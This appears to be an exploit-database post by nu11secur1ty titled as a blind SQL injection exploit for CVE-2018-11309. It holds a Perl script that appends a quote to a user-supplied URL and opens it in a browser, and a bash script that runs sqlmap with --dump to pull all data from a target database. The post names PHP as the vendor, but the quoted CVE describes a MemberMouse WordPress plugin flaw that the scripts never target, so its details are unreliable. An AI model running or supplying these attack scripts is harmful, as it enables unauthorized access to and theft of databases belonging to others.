# Exploit Title: web app - Blind SQL injection
# Author: nu11secur1ty
# Date: 2020-02-19
# Vendor: PHP
# Link: https://www.php.net/
# CVE: CVE-2018-11309



[+] Credits: Ventsislav Varbanovski (@ nu11secur1ty)		
[+] Website: https://www.nu11secur1ty.com/
[+] Source:  readme from GitHUB
[+] twitter.com/nu11secur1ty


[Exploit Programs]
- wetpusseysql.pl - Finder of vulnerbility

#!/usr/bin/perl
#
# wetpusseysql is a program for testing of MySQL vulnerabilities.
# This is a simple and strong program for testing of vulnerabilities of MySQL server
# Author V.Varbanovski @nu11secur1ty 2019-2020
# Version ∞
####################################################################################
use strict;
use warnings;
use diagnostics;
use Browser::Open qw( open_browser );
use Term::ANSIColor;


print color('bold blue');

print"                           o8                                                                                               o888 
oooo  o  oooo ooooooooo8 o888oo ooooooooo  oooo  oooo   oooooooo8  oooooooo8   ooooooooo8 oooo   oooo oooooooo8    ooooooooo 888 
 888 888 888 888oooooo8   888    888    888 888   888  888ooooooo 888ooooooo  888oooooo8   888   888 888ooooooo  888    888  888 
  888888888  888          888    888    888 888   888          888        888 888           888 888          888 888    888  888 
   88   88     88oooo888   888o  888ooo88    888o88 8o 88oooooo88 88oooooo88    88oooo888     8888   88oooooo88    88ooo888 o888o
                                o888                                                       o8o888                       888o 
                                Version ∞ \n\n\n";
print color('reset');

print color('bold red');
print "Use Ctrl + C to stop the wetpusseysql\n";
        print color('reset');

print "Please put your correct URL here\n";
print "which you will copy from your browser.\n";

our $url = <>;
        chomp($url);
        our $element_vulnerability_prostak = "'";
                chomp($element_vulnerability_prostak);
                our $action = $url.$element_vulnerability_prostak;
        open_browser($action);
exit;

----------------------------------------------------------
- Exploit 

#!/usr/bin/bash
# by nu11secur1ty 2020
# Using sqlmap package

echo -e "\e[1;32mGive the vulnerability domain URL..\e[033m"
echo -e "\e[1;33mExample: http://www.domain.com/app.php?id=1\e[033m"
        read domain_exploited
sqlmap -u $domain_exploited --dump
        exit 0;

[Vendor]
PHP


[Product]
web app PHP


[Vulnerability Type]
remote


[CVE Reference]
https://www.cvedetails.com/cve/CVE-2018-11309/
Blind SQL injection in coupon_code in the MemberMouse plugin 2.2.8 and prior for 
WordPress allows an unauthenticated attacker to dump the WordPress
MySQL database via an applyCoupon action in an admin-ajax.php request. 1=1

[Security Issue]
Remote Unauthorized access to MySQL, and get all data information for the victim


[Network Access]
Remote


nu11secur1ty
BR




